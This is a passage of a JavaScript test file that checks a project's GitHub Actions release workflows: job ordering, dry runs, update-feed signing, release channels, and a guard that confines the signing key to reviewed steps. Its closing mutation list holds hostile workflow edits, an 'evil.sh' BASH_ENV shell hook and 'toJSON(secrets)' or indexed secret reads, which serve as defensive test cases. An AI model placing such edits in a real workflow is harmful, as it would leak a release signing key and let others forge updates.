  assert.match(workflow, /artifact-docker-test-container:[\s\S]*?needs:\s*\[beta-version, packages, docker\]/);
  assert.match(workflow, /artifact-docker-test-cli:[\s\S]*?needs:\s*\[beta-version, cli, sdn-js-package\]/);
  // The release names every check itself: the builds start beside Preflight
  // and the key check instead of after them, so nothing reaches the release
  // through a build any more. The image push needs Preflight too, and a dry
  // run (publish false) skips everything that writes outside the run.
  const jobs = yaml.load(workflow).jobs;
  const needs = (name) => [jobs[name]?.needs ?? []].flat();
  for (const name of Object.keys(jobs)) {
    if (name === 'release' || name === 'published-installer-smoke') continue;
    assert.ok(needs('release').includes(name), `the release must need ${name}`);
  }
  assert.ok(needs('docker-push').includes('preflight'), 'the image push must need Preflight');
  assert.ok(needs('docker-manifest').includes('docker-push'), 'the manifest must need the pushed images');
  assert.match(workflow, /- name: Check the token can publish a release\n\s+if: inputs\.publish != false\n/);
  for (const name of ['docker-manifest', 'release', 'published-installer-smoke']) {
    assert.equal(jobs[name].if, 'inputs.publish != false', `${name} must be skipped by a dry run`);
  }
  const push = jobs['docker-push'].steps.find((step) => step.id === 'build');
  assert.match(push.with.outputs, /push=\$\{\{ inputs\.publish != false \}\}$/);
  for (const [name, job] of Object.entries(jobs)) {
    assert.doesNotMatch(JSON.stringify(job), /push=true/, `${name} must push only through docker-push`);
  }
});

test('the update feed job fails a stable release without its key, signs with the derived key id only, and verifies every manifest against the fleet roots', () => {
  const workflow = readRepoFile('.github/workflows/beta-release-artifacts.yml');
  const jobs = splitWorkflowJobs(workflow);
  const job = jobs['cli-update-feed'];

  // A missing key is decided by check-update-signing-key.mjs, which fails a
  // stable release; the old shell check only warned, for every release.
  assert.match(job, /check-update-signing-key\.mjs[\s\S]*?--maturity "\$\{RELEASE_MATURITY\}"[\s\S]*?--roots deployment\/release\/fleet-trust-roots\.json[\s\S]*?--github-output "\$key_check"/);
  assert.doesNotMatch(job, /::warning title=Unsigned release::/);
  assert.doesNotMatch(job, /\[\[ -n "\$\{SDN_UPDATE_SIGNING_KEY_PEM:-\}" \]\]/);

  // No fallback key id: the id is the one derived from the PEM.
  assert.doesNotMatch(job, /SDN_UPDATE_KEY_ID:-/);
  assert.doesNotMatch(job, /sdn-beta-release/);
  assert.match(job, /update_key_id="\$\(sed/);
  assert.match(job, /test -n "\$update_key_id"/);
  assert.match(job, /--key-id "\$\{update_key_id\}"/);

  // A signer built in this job from the checked-out commit signs and verifies
  // every indexed signal before packing; no downloaded program runs here.
  assert.match(job, /CGO_ENABLED=0 "\$\{go_bin\}" build -trimpath \\\n\s+-o "\$RUNNER_TEMP\/sdn-signal-signer\/sdn-update-signal-signer" \.\/cmd\/sdn-update-signal-signer\n/);
  assert.match(job, /sdn-update-signal-signer" \\\n\s+--key-env SDN_UPDATE_SIGNING_KEY_PEM/);
  assert.match(job, /sdn-update-signal-signer" --verify-only[\s\S]*--roots deployment\/release\/fleet-trust-roots\.json/);
  assert.ok(job.indexOf('sdn-update-signal-signer" --verify-only') < job.indexOf('tar -czf "dist/update-feed/'));

  // Nothing another job produced is unpacked where the key is: the CLI
  // archives are unpacked in cli-update-payloads, the feed in
  // cli-update-feed-verify, and this job downloads only the payloads.
  assert.doesNotMatch(job, /tar -x|unzip|merge-multiple|pattern:|build-cli-update-payload\.mjs|verify-cli-update-feed\.mjs/);
  assert.match(job, /name: cli-update-payloads\n\s+path: dist\/update-payloads\n/);
  assert.match(jobs['cli-update-payloads'], /build-cli-update-payload\.mjs \\\n\s+--bundle-archive "\$\{archive_path\}" \\\n\s+--carrier-out-dir /);
  assert.doesNotMatch(jobs['cli-update-payloads'], /secrets\.|environment:/);

  // Every manifest is verified against the fleet roots, payloads unpacked, in
  // a job without the key, and the release waits for it.
  const verifyJob = jobs['cli-update-feed-verify'];
  assert.doesNotMatch(verifyJob, /secrets\.|environment:/);
  assert.match(verifyJob, /verify-cli-update-feed\.mjs \\\n\s+--feed-dir dist\/feed-check\/update-feed \\\n\s+--roots deployment\/release\/fleet-trust-roots\.json/);
  assert.match(jobs.release, /needs: \[[^\]]*cli-update-feed-verify/);
});

test('beta release workflow builds desktop app artifacts for every supported OS', () => {
  const workflow = readRepoFile('.github/workflows/beta-release-artifacts.yml');

  assert.match(workflow, /desktop:\s*\n\s*name:\s*Build desktop app artifacts/);
  // The desktop app SHIPS the node, so it waits on the cli archives rather than
  // on the IPFS asset job. It no longer stages its own copy of the dashboard:
  // the node serves the one embedded in its binary (//go:embed dashboard.html),
  // and a second copy in desktop/assets/sdn-ui was the old architecture.
  assert.match(workflow, /desktop:[\s\S]*?needs:\s*\[beta-version, cli\]/);
  assert.doesNotMatch(workflow, /desktop\/assets\/sdn-ui\//);
  // macos-15 for Apple Silicon: GitHub no longer runs macos-14, and a leg on
  // an unsupported runner is cancelled before it starts (run 43639422366).
  assert.match(workflow, /target_os:\s*macos[\s\S]*runner:\s*macos-15(?!-)/);
  assert.match(workflow, /target_os:\s*macos[\s\S]*runner:\s*macos-15-intel/);
  assert.doesNotMatch(workflow, /runner:\s*macos-14\b/);
  assert.match(workflow, /target_os:\s*windows[\s\S]*runner:\s*windows-latest/);
  assert.match(workflow, /target_os:\s*linux[\s\S]*runner:\s*ubuntu-latest/);
  assert.match(workflow, /npm --prefix desktop ci/);
  // Each app carries the bundle built for its own OS and architecture.
  assert.match(workflow, /stage-node-bundle\.mjs --from/);
  assert.match(workflow, /electron-builder --publish never \$\{\{ matrix\.builder_args \}\}/);
  assert.match(workflow, /builder_args:\s*--mac dmg zip --arm64/);
  assert.match(workflow, /builder_args:\s*--mac dmg zip --x64/);
  assert.match(workflow, /builder_args:\s*--win nsis portable --x64/);
  assert.match(workflow, /builder_args:\s*--linux AppImage deb tar\.xz --x64/);
  assert.match(workflow, /name:\s*desktop-\$\{\{ matrix\.target_os \}\}/);
  assert.match(workflow, /path:\s*dist\/desktop\/\*/);
  assert.match(workflow, /needs:\s*\[[^\]]*\bdesktop\b[^\]]*\bartifact-docker-test\b[^\]]*\]\n\s+if: inputs\.publish != false/);
  assert.match(workflow, /pattern:\s*desktop-\*[\s\S]*path:\s*dist\/desktop[\s\S]*merge-multiple:\s*true/);
});

test('macos_desktop false ships a release without the macOS desktop app, and only then', () => {
  // Owner decision 2026-11-14, "Forget Apple desktop for now".
  const workflow = readRepoFile('.github/workflows/beta-release-artifacts.yml');
  assert.match(workflow, /macos_desktop:\n\s+description: [^\n]+\n\s+required: false\n\s+type: boolean\n\s+default: true/);
  assert.match(workflow, /Forget Apple desktop for now/);
  const desktop = workflow.slice(workflow.indexOf('\n  desktop:\n'), workflow.indexOf('\n  packages:\n'));
  assert.match(desktop, /continue-on-error: \$\{\{ matrix\.experimental == true \|\| \(matrix\.target_os == 'macos' && inputs\.macos_desktop == false\) \}\}/);
  assert.match(desktop, /MACOS_DESKTOP_OFF: \$\{\{ matrix\.target_os == 'macos' && inputs\.macos_desktop == false \}\}/);
  for (const step of ['Stage the App Store Connect key', 'Build Desktop artifacts', 'Collect Desktop artifacts']) {
    const at = desktop.indexOf(`- name: ${step}\n`);
    assert.ok(at > 0, step);
    assert.match(desktop.slice(at, at + 200), /\n\s+if: [^\n]*env\.MACOS_DESKTOP_OFF != 'true'/, step);
  }
  assert.match(desktop, /- uses: actions\/upload-artifact@v4\n\s+if: env\.MACOS_DESKTOP_OFF != 'true'/);
  const release = workflow.slice(workflow.indexOf('\n  release:\n'), workflow.indexOf('\n  published-installer-smoke:\n'));
  assert.match(release, /- name: Merge the macOS update feeds into one latest-mac\.yml\n\s+if: inputs\.macos_desktop != false/);
  assert.match(release, /MACOS_DESKTOP: \$\{\{ inputs\.macos_desktop != false \}\}/);
  // The installer smoke installs the CLI (install.sh / install.ps1), never a
  // desktop installer, so it needs no macOS desktop asset.
  assert.doesNotMatch(readRepoFile('deployment/release/published-install-smoke.mjs'), /\.dmg|desktop/i);
});

test('beta release workflow smoke-tests published installers after release', () => {
  const workflow = readRepoFile('.github/workflows/beta-release-artifacts.yml');

  assert.match(workflow, /published-installer-smoke:\s*\n\s*name:\s*Smoke published installers/);
  assert.match(workflow, /published-installer-smoke:[\s\S]*needs:\s*\[beta-version, release\]/);
  assert.match(workflow, /SDN_VERSION:\s*\$\{\{ needs\.beta-version\.outputs\.release_tag \}\}/);
  assert.match(workflow, /target_os:\s*linux[\s\S]*runner:\s*ubuntu-latest/);
  assert.match(workflow, /target_os:\s*macos[\s\S]*runner:\s*macos-15(?!-)/);
  assert.match(workflow, /target_os:\s*windows[\s\S]*runner:\s*windows-latest/);
  assert.match(workflow, /node deployment\/release\/published-install-smoke\.mjs --platform \$\{\{ matrix\.target_os \}\}/);
});

test('npm release publishing maps beta releases to the beta dist-tag', () => {
  const workflow = readRepoFile('.github/workflows/npm-publish-sdn-js.yml');

  assert.match(workflow, /beta\)/);
  assert.match(workflow, /echo "tag=beta"/);
});

test('npm publishing asks npm first and skips everything for a version it already has', () => {
  // The v1.1.0 release asked to publish sdn-js 4.0.0, already on npm, and
  // failed at the test step anyway (run 43642811010).
  const workflow = readRepoFile('.github/workflows/npm-publish-sdn-js.yml');
  const order = ['Is this version already on npm?', 'Install dependencies', 'Test', 'Build', 'Publish to npm']
    .map((name) => workflow.indexOf(`- name: ${name}\n`));
  assert.ok(order.every((at) => at > 0), `missing step: ${order}`);
  assert.deepEqual([...order].sort((a, b) => a - b), order, 'the npm check must run before install, test and build');
  const gate = "if: ${{ steps.published.outputs.already == 'false' || (github.event_name == 'workflow_dispatch' && inputs.dry_run) }}";
  for (const name of ['Install dependencies', 'Test', 'Verify helia/libp2p dependency layering', 'Build', 'Verify package contents']) {
    const step = workflow.slice(workflow.indexOf(`- name: ${name}\n`)).split('\n      - ')[0];
    assert.ok(step.includes(gate), `${name} must be skipped when the version is already on npm`);
  }
});

test('release workflows install nFPM from a pinned Go module version', () => {
  for (const workflowPath of [
    '.github/workflows/beta-release-artifacts.yml',
    '.github/workflows/release-deploy.yml'
  ]) {
    const workflow = readRepoFile(workflowPath);

    assert.match(workflow, /NFPM_VERSION:\s*v\d+\.\d+\.\d+/);
    assert.match(workflow, /go install "github\.com\/goreleaser\/nfpm\/v2\/cmd\/nfpm@\$\{NFPM_VERSION\}"/);
    assert.match(workflow, /nfpm" --version/);
    assert.doesNotMatch(workflow, /goreleaser\/nfpm\/main\/www\/docs\/install\.sh/);
  }
});

test('push packaging workflows build IPFS WebUI before packaging full-node assets', () => {
  for (const workflowPath of [
    '.github/workflows/docker-publish.yml',
    '.github/workflows/linux-vm-bundle.yml'
  ]) {
    const workflow = readRepoFile(workflowPath);

    assert.match(workflow, /working-directory:\s*webui/, `${workflowPath} must install and build webui assets`);
    assert.match(workflow, /npm ci[\s\S]*npm run build/, `${workflowPath} must build webui/build before packaging`);
  }
});

test('container publish workflow ships one Docker Hub image', () => {
  const workflow = readRepoFile('.github/workflows/docker-publish.yml');

  assert.match(workflow, /REGISTRY:\s*docker\.io/);
  assert.match(workflow, /IMAGE_NAME:\s*dockerdigitalarsenal\/space-data-network/);
  assert.match(workflow, /username:\s*dockerdigitalarsenal/);
  assert.match(workflow, /secrets\.DOCKERHUB_TOKEN/);
  assert.match(workflow, /deployment\/docker\/Dockerfile/);
  // The web UI build downloads no browser (see ipfs-deploy.sh, same three).
  const webuiStep = /- name: Build the Kubo web UI[\s\S]*?run: \|/.exec(workflow)?.[0] ?? '';
  assert.match(webuiStep, /PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD: '1'/);
  assert.match(webuiStep, /PUPPETEER_SKIP_DOWNLOAD: '1'/);
  assert.match(webuiStep, /CYPRESS_INSTALL_BINARY: '0'/);
  assert.doesNotMatch(workflow, /matrix:/);
  assert.doesNotMatch(workflow, /Dockerfile\.full/);
  assert.doesNotMatch(workflow, /Dockerfile\.edge/);
  assert.doesNotMatch(workflow, /space-data-network-full/);
  assert.doesNotMatch(workflow, /space-data-network-edge/);
});

test('single Dockerfile defaults to full node and keeps edge mode as command override', () => {
  const dockerfile = readRepoFile('deployment/docker/Dockerfile');

  // The image builds the daemon through the SAME wrapper every other build
  // product uses, so the static link line has exactly one definition. It used
  // to carry a hand-written copy of the archive list, which went stale and
  // failed to link (missing libwasmedgePluginWasiLogging.a) while the CLI
  // archives built fine off the real list.
  assert.match(dockerfile, /go-with-wasmedge\.sh build -o \/out\/spacedatanetwork \.\/cmd\/spacedatanetwork/);
  assert.doesNotMatch(dockerfile, /llvm-config-16 --link-static/);
  assert.match(dockerfile, /go build -tags edge[\s\S]*-o \/out\/spacedatanetwork-edge \.\/cmd\/spacedatanetwork-edge/);
  // Fails the build rather than shipping an image that needs a runtime present.
  assert.match(dockerfile, /ldd \/out\/spacedatanetwork \| grep -qi wasmedge/);
  // The entrypoint is a thin wrapper, not the binary directly: an AOT artifact
  // is native code for the CPU that compiles it, so it cannot be baked into a
  // portable image (doing so killed nodes with SIGILL on hosts whose CPU lacked
  // the builder's instruction set). The wrapper compiles on first start and
  // must still exec the real binary with the container's command intact.
  assert.match(dockerfile, /ENTRYPOINT \["\/app\/entrypoint\.sh"\]/);
  assert.doesNotMatch(dockerfile, /^RUN \/app\/spacedatanetwork prewarm-aot$/m);
  const entrypoint = readRepoFile('deployment/docker/entrypoint.sh');
  assert.match(entrypoint, /exec \/app\/spacedatanetwork "\$@"/);
  assert.match(entrypoint, /prewarm-aot/);
  assert.match(dockerfile, /CMD \["daemon", "--config", "\/app\/config\/full-docker\.yaml"\]/);
});

test('nothing invokes an npm script its package.json does not declare', () => {
  // `npm run build:ui` outlived the script by months. Deleting it broke
  // nothing at the time; the jobs failed one at a time, whenever each next ran
  // — ipfs-deploy.sh first, then the release packages job, on the same missing
  // script. A deleted script is invisible to every caller until that caller
  // runs, which for a release job can be weeks.
  const scriptsAt = (dir) => {
    try {
      return JSON.parse(readRepoFile(dir ? `${dir}/package.json` : 'package.json')).scripts ?? {};
    } catch {
      return null;
    }
  };
  // Where an unprefixed `npm run` could be resolving from: the caller either
  // cd'd or set working-directory, which this cannot see, so accept any.
  const anyRoot = ['', 'sdn-js', 'webui'];
  const callers = [
    'deployment/scripts/package-linux-vm-bundle.sh',
    'deployment/scripts/deploy.sh',
    'deployment/ipfs/ipfs-deploy.sh',
    'scripts/admin-dev.sh',
    '.github/workflows/beta-release-artifacts.yml',
    '.github/workflows/security.yml',
  ];

  let checked = 0;
  for (const caller of callers) {
    const text = readRepoFile(caller);
    for (const m of text.matchAll(/npm(?:\s+--prefix\s+(\S+))?\s+run\s+([A-Za-z0-9:_-]+)/g)) {
      const [, rawPrefix, script] = m;
      if (script.includes('$')) continue;
      const prefix = rawPrefix?.replace(/^\.\//, '').replace(/\/$/, '');
      const dirs = prefix ? [prefix] : anyRoot;
      const known = dirs.map(scriptsAt);
      // A prefix naming no package.json at all is its own bug.
      assert(
        known.some((s) => s !== null),
        `${caller} runs npm --prefix ${prefix}, where there is no package.json`,
      );
      assert(
        known.some((s) => s?.[script]),
        `${caller} runs "npm run ${script}", which no package.json in ${dirs.join(', ') || 'the repo root'} declares`,
      );
      checked += 1;
    }
  }
  assert(checked > 0, 'the npm-script scan matched nothing — the pattern has rotted');
});

test('every containerised job prepares its container, and none of them uses sudo', () => {
  const workflow = readRepoFile('.github/workflows/beta-release-artifacts.yml');
  const lines = workflow.split('\n');

  // A bare image has no git and no curl, so a container job without its
  // preparation step fails somewhere far from the cause — checkout silently
  // falls back to a tarball download, and the failure surfaces later as
  // "curl: command not found" in a completely different step. That is exactly
  // how this went wrong: the step was inserted into the wrong job because the
  // anchor text it matched appears in several.
  const jobs = {};
  let current = null;
  for (const line of lines) {
    const header = /^ {2}([a-z0-9_-]+):$/.exec(line);
    if (header) {
      current = header[1];
      jobs[current] = { container: false, prepare: false, sudo: false };
      continue;
    }
    if (!current) continue;
    if (/^ {4}container:/.test(line)) jobs[current].container = true;
    if (line.includes('- name: Prepare the container')) jobs[current].prepare = true;
    // a comment saying "No sudo" is not a use of it
    if (/\bsudo\b/.test(line) && !/^\s*#/.test(line.trim()) && !line.trim().startsWith('#')) {
      jobs[current].sudo = true;
    }
  }

  const containerised = Object.entries(jobs).filter(([, v]) => v.container);
  assert(containerised.length > 0, 'no job declares a container any more — has the Linux build moved?');

  for (const [name, v] of containerised) {
    assert(v.prepare, `job "${name}" runs in a container but never installs git/curl into it`);
    assert(!v.sudo, `job "${name}" runs in a container as root, where sudo does not exist`);
  }

  // And the inverse: a preparation step in a job with no container is dead
  // code that will be silently skipped.
  for (const [name, v] of Object.entries(jobs)) {
    if (v.prepare && !v.container) {
      assert.fail(`job "${name}" prepares a container it does not have`);
    }
  }
});

test('released bundles and their update feed are stamped with the public release channel', () => {
  // 2026-09-16: releases were stamped --channel beta, the same channel the
  // internal fleet dev lane (publish-fleet-update.mjs) publishes binary-only
  // payloads to, signed by the same root a release pins. A fresh install has
  // no update state, so every feed entry looked newer and the highest
  // sequence — a dev-lane payload with no runtime/ — was selected and
  // applied, retiring the install's whole runtime/ tree. The channel is the
  // only thing separating the two audiences, so it is pinned here.
  const workflow = readRepoFile('.github/workflows/beta-release-artifacts.yml');

  const bundleBuild = /build-self-contained-cli\.mjs[\s\S]*?--manifest-signature/.exec(workflow);
  assert.ok(bundleBuild, 'the workflow must still build bundles with build-self-contained-cli.mjs');
  assert.match(bundleBuild[0], /--channel release/);
  assert.doesNotMatch(bundleBuild[0], /--channel beta/);

  const feedBuild = /sign-cli-update-payload\.mjs[\s\S]*?--created-at/.exec(workflow);
  assert.ok(feedBuild, 'the workflow must still sign update payloads with sign-cli-update-payload.mjs');
  assert.match(feedBuild[0], /--channel release/);
  assert.doesNotMatch(feedBuild[0], /--channel beta/);

  // Same for the local/offline assembly lane, which publishes the same feed.
  const assemble = readRepoFile('deployment/release/assemble-beta-release-artifacts.sh');
  assert.doesNotMatch(assemble, /--channel beta/);
  // The assembler builds no feed of its own: it ships the job's verified one.
  assert.doesNotMatch(assemble, /build-cli-update-payload\.mjs|build-sdn-update-feed\.js|SDN_UPDATE_KEY_ID:-/);

  // And the same check runs in the first job, before any build, so a stable
  // release without a usable key fails in minutes instead of after the
  // five-platform cli matrix.
  const first = workflow.slice(workflow.indexOf('  beta-version:'), workflow.indexOf('  wasmedge-static:'));
  assert.match(first, /name: Check the update signing key[\s\S]*check-update-signing-key\.mjs/);
  assert.doesNotMatch(splitWorkflowJobs(workflow)['beta-version'], /SDN_UPDATE_SIGNING_KEY_PEM/);
  assert.match(splitWorkflowJobs(workflow)['cli'], /needs: .*update-signing-check/);
});

test('release maturity reaches only the release notes, never a --channel', () => {
  // prepare-beta-release.mjs's `channel` output is the release MATURITY (beta
  // or stable), not an update channel. It words the notes and the manifest;
  // a bundle or payload stamped with it would leave the public channel.
  const workflow = readRepoFile('.github/workflows/beta-release-artifacts.yml');
  // It is read in two places, both as RELEASE_MATURITY: the release notes, and
  // the update signing-key check (a stable release must ship its feed).
  const uses = [...workflow.matchAll(/^.*needs\.beta-version\.outputs\.channel.*$/gm)].map((m) => m[0].trim());
  assert.deepEqual(uses, [
    'RELEASE_MATURITY: ${{ needs.beta-version.outputs.channel }}',
    'RELEASE_MATURITY: ${{ needs.beta-version.outputs.channel }}',
    'RELEASE_MATURITY: ${{ needs.beta-version.outputs.channel }}',
  ]);
  assert.match(workflow, /name: Sign the CLI update manifests\n\s+id: signing/);
  assert.match(workflow, /name: Assemble beta release artifacts\n\s+env:[\s\S]*?RELEASE_MATURITY:[\s\S]*?run: deployment\/release\/assemble-beta-release-artifacts\.sh/);
  assert.doesNotMatch(workflow, /--channel \$\{\{/);

  const assemble = readRepoFile('deployment/release/assemble-beta-release-artifacts.sh');
  assert.doesNotMatch(assemble, /--channel "?\$\{?release_maturity/);
});


test('the real update channel runs prebuilt fixtures with only loopback networking', () => {
  const workflow = readRepoFile('.github/workflows/ci.yml');
  const job = workflow.slice(workflow.indexOf('  update-channel-e2e:'), workflow.indexOf('  go-builds:'));
  // The job names an ordinary user and runs the update-channel lane, which
  // then builds the fixtures and runs the test as that user, loopback only.
  assert.match(job, /options: --cap-add SYS_ADMIN --cap-add NET_ADMIN/);
  assert.match(job, /useradd --create-home update-e2e/);
  assert.match(job, /SDN_E2E_UPDATE_USER: update-e2e/);
  assert.match(job, /^\s+\.\/scripts\/ci-local\.sh update-channel$/m);
  assert.doesNotMatch(job, /\bsudo\b/);
  assert.match(job, /if: always\(\)/);
  const lane = extractShellFunction(readRepoFile('scripts/ci-local.sh'), 'run_update_channel_isolated');
  assert.match(lane, /for build in v1 v2 v3/);
  assert.match(lane, /sdn_e2e_not_ready/);
  assert.match(lane, /go-with-wasmedge\.sh test -c/);
  assert.match(lane, /SDN_E2E_REAL_DAEMON_BIN_DIR=/);
  assert.match(lane, /unshare --net -- bash -c 'set -e; ip link set lo up;/);
  assert.match(lane, /setpriv --reuid="\$1" --regid="\$2" --init-groups/);
  assert.match(lane, /-- "\$\(id -u "\$user"\)" "\$\(id -g "\$user"\)"/);
  assert.match(lane, /tee "\$logs\/test\.log"/);
  assert.match(lane, /-test\.timeout=50m/);
  assert.ok(lane.indexOf('go-with-wasmedge.sh test -c') < lane.indexOf('unshare --net'));
});

// The expressions in a workflow value, as the runner finds them: each starts
// at ${{ and ends at the first }} outside a string literal. A string literal
// is single-quoted, with '' for a quote, so toggling on every ' tracks it.
function workflowExpressions(value) {
  const expressions = [];
  for (let at = value.indexOf('${{'); at >= 0; at = value.indexOf('${{', at)) {
    let inString = false;
    let end = -1;
    for (let i = at + 3; i < value.length; i++) {
      if (value[i] === "'") inString = !inString;
      else if (!inString && value.startsWith('}}', i)) {
        end = i;
        break;
      }
    }
    assert.ok(end >= 0, 'unterminated expression');
    expressions.push(value.slice(at + 3, end));
    at = end + 2;
  }
  return expressions;
}

// The tokens of one expression, with their offsets; string literals are one
// token each. Text that is not an expression token fails.
function expressionTokens(text) {
  const pattern = /(\s+)|('(?:[^']|'')*')|([A-Za-z_][A-Za-z0-9_-]*)|(0x[0-9A-Fa-f]+|\d+(?:\.\d+)?(?:[eE][+-]?\d+)?)|(==|!=|<=|>=|&&|\|\||[()[\].,*!<>-])/y;
  const tokens = [];
  pattern.lastIndex = 0;
  while (pattern.lastIndex < text.length) {
    const start = pattern.lastIndex;
    const match = pattern.exec(text);
    assert.ok(match, `unreadable expression text at ${start}: ${JSON.stringify(text.slice(start, start + 20))}`);
    if (match[1]) continue;
    const kind = match[2] ? 'string' : match[3] ? 'name' : match[4] ? 'number' : 'operator';
    tokens.push({ kind, text: match[0], start, end: pattern.lastIndex });
  }
  return tokens;
}

// Exact reviewed shell programs form an allow-list, including their arguments,
// substitutions and control flow. A new command requires an explicit review here.
function guardUpdateSigningWorkflow(workflow, path = '.github/workflows/beta-release-artifacts.yml') {
  const parsed = yaml.load(workflow);
  const isRelease = path === '.github/workflows/beta-release-artifacts.yml';
  const keyJobs = new Set(['update-signing-check', 'cli-update-feed']);
  // Only the reviewed key jobs of the release workflow may name the signing
  // Environment. Any other environment is a literal name that is not it.
  for (const [jobName, job] of Object.entries(parsed?.jobs ?? {})) {
    if (!job || typeof job !== 'object' || !Object.hasOwn(job, 'environment')) continue;
    const environment = typeof job.environment === 'object' && job.environment !== null ? job.environment.name : job.environment;
    if (isRelease && keyJobs.has(jobName)) continue;
    assert.equal(typeof environment, 'string', `unreviewed environment in ${path} job ${jobName}`);
    assert.doesNotMatch(environment, /\$\{\{|update[\s_-]*signing/i, `unreviewed signing environment in ${path} job ${jobName}`);
  }
  // A called workflow is outside this scan, and its jobs could name the
  // signing Environment: no job calls one.
  for (const [jobName, job] of Object.entries(parsed?.jobs ?? {})) {
    assert.ok(!job || typeof job !== 'object' || !Object.hasOwn(job, 'uses'), `reusable workflow call in ${path} job ${jobName} is not reviewed`);
  }
  // Every expression is read the way the runner reads it (workflowExpressions,
  // expressionTokens). Each use of the secrets context must name one secret,
  // secrets.NAME; the key only as the whole value of the reviewed step's env.
  function checkExpression(text, value, trail) {
    const tokens = expressionTokens(text);
    for (let i = 0; i < tokens.length; i++) {
      const token = tokens[i];
      if (token.kind !== 'name' || token.text.toLowerCase() !== 'secrets' || tokens[i - 1]?.text === '.') continue;
      const [dot, name, after] = [tokens[i + 1], tokens[i + 2], tokens[i + 3]];
      assert.ok(dot?.text === '.' && dot.start === token.end && name?.kind === 'name' && name.start === dot.end &&
        /^[A-Za-z_][A-Za-z0-9_]*$/.test(name.text) && !['.', '['].includes(after?.text), 'indirect secret access is not reviewed');
      if (name.text.toLowerCase() !== 'sdn_update_signing_key_pem') continue;
      assert.equal(value, '${{ secrets.SDN_UPDATE_SIGNING_KEY_PEM }}', 'noncanonical key reference');
      assert.ok(isRelease && trail.length === 6 && trail[0] === 'jobs' && keyJobs.has(trail[1]) &&
        trail[2] === 'steps' && trail[4] === 'env' && trail[5] === 'SDN_UPDATE_SIGNING_KEY_PEM', 'PEM outside reviewed step');
    }
  }
  function walk(value, trail = []) {
    if (typeof value === 'string') {
      if (trail.at(-1) === 'secrets') assert.notEqual(value.toLowerCase(), 'inherit', 'inherited secrets are not reviewed');
      // An if: is an expression with or without ${{ }}.
      const expressions = trail.at(-1) === 'if' && !value.includes('${{') ? [value] : workflowExpressions(value);
      for (const text of expressions) checkExpression(text, value, trail);
    } else if (value && typeof value === 'object') {
      for (const [key, child] of Object.entries(value)) walk(child, [...trail, key]);
    }
  }
  walk(parsed);
  // Everything the key signs comes from the key jobs and the jobs they need,
  // directly or through other jobs: there every action is pinned to a commit.
  if (isRelease) {
    const upstream = new Set();
    const visit = (name) => {
      if (upstream.has(name)) return;
      upstream.add(name);
      const needs = parsed.jobs[name]?.needs ?? [];
      for (const need of Array.isArray(needs) ? needs : [needs]) visit(need);
    };
    for (const name of keyJobs) visit(name);
    for (const name of upstream) {
      for (const step of parsed.jobs[name]?.steps ?? []) {
        if (step.uses) assert.match(step.uses, /^(?:\.\/[^@]+|[\w.-]+\/[\w.\/-]+@[0-9a-f]{40})$/, `action not pinned to a commit in ${name}, whose output is signed: ${step.uses}`);
        // A merged download lets any artifact matching the pattern replace another's files.
        assert.ok(!(String(step.uses).startsWith('actions/download-artifact@') && step.with?.['merge-multiple']), `merged artifacts in ${name}, whose output is signed`);
      }
    }
  }
  if (!isRelease) return;
  assert.ok(!Object.hasOwn(parsed, 'defaults'), 'workflow defaults affect signing jobs');
  const allowedRuns = JSON.parse(readRepoFile('deployment/release/update-signing-allowed-runs.json'));
  const reviewed = JSON.parse(readRepoFile('deployment/release/update-signing-allowed-jobs.json'));
  assert.deepEqual(parsed.env, reviewed.env, 'unreviewed workflow environment');
  for (const name of keyJobs) {
    const job = parsed.jobs[name];
    assert.ok(job, `missing signing job: ${name}`);
    assert.equal(job.environment, 'update-signing');
    assert.ok(!job.defaults && !job.container && !job.services);
    for (const step of job.steps) {
      if (step.uses) assert.match(step.uses, /^actions\/[a-z-]+@[a-f0-9]{40}$/);
      if (step.env?.SDN_UPDATE_SIGNING_KEY_PEM) {
        assert.ok(!Object.hasOwn(step, 'shell') && !Object.hasOwn(step, 'working-directory'));
        const names = {
          'Check the update signing key': ['RELEASE_MATURITY', 'SDN_UPDATE_SIGNING_KEY_PEM', 'SDN_UPDATE_KEY_ID'],
          'Sign the CLI update manifests': ['RELEASE_MATURITY', 'SDN_UPDATE_SIGNING_KEY_PEM'],
          'Sign the update signals': ['SDN_UPDATE_SIGNING_KEY_PEM'],
        }[step.name];
        assert.ok(names, `unreviewed signing step: ${step.name}`);
        assert.deepEqual(Object.keys(step.env).sort(), names.sort(), 'unreviewed signing environment');
      }
    }
    const expected = structuredClone(reviewed.jobs[name]);
    for (const step of expected.steps) {
      if (step.reviewedRun) {
        step.run = allowedRuns[step.reviewedRun].replace(/^          /gm, '') + '\n';
        delete step.reviewedRun;
      }
    }
    assert.deepEqual(job, expected, `unreviewed signing job: ${name}`);
  }
  assert.ok(parsed.jobs.cli.needs.includes('update-signing-check'), 'CLI matrix requires early key validation');
}

test('update signing uses only reviewed programs and scopes every PEM reference', () => {
  for (const file of readdirSync(join(repoRoot, '.github/workflows'), {recursive: true})) {
    if (/\.ya?ml$/i.test(file)) {
      const path = `.github/workflows/${file}`;
      guardUpdateSigningWorkflow(readRepoFile(path), path);
    }
  }
});

const signerStep = '      - name: Build the release signal signer';
const reviewedMutations = {
  'job default shell runs a hook': w => w.replace('  cli-update-feed:\n', '  cli-update-feed:\n    defaults:\n      run:\n        shell: env BASH_ENV=./evil.sh bash -e {0}\n'),
  'step shell after run block': w => w.replace("            --key-env SDN_UPDATE_SIGNING_KEY_PEM --feed-dir dist/update-feed-tree/update-feed \\\n            --roots deployment/release/fleet-trust-roots.json\n", "            --key-env SDN_UPDATE_SIGNING_KEY_PEM --feed-dir dist/update-feed-tree/update-feed \\\n            --roots deployment/release/fleet-trust-roots.json\n        shell: env BASH_ENV=./evil.sh bash -e {0}\n"),
  'lowercase context in beta-version step': w => w.replace("          INPUT_VERSION: ${{ inputs.version }}\n", "          INPUT_VERSION: ${{ inputs.version }}\n          K: ${{ secrets.sdn_update_signing_key_pem }}\n"),
  'spaced-dot in another job': w => w.replace("          INPUT_VERSION: ${{ inputs.version }}\n", "          INPUT_VERSION: ${{ inputs.version }}\n          K: ${{ SECRETS.SDN_UPDATE_SIGNING_KEY_PEM }}\n"),
  'bracket index syntax': w => w.replace(signerStep, signerStep + "\n        env:\n          RENAMED: ${{ secrets['SDN_UPDATE_SIGNING_KEY_PEM'] }}"),
  'lowercase context': w => w.replace(signerStep, signerStep + "\n        env:\n          RENAMED: ${{ secrets.sdn_update_signing_key_pem }}"),
  'toJSON(secrets)': w => w.replace(signerStep, signerStep + "\n        env:\n          ALL: ${{ toJSON(secrets) }}"),
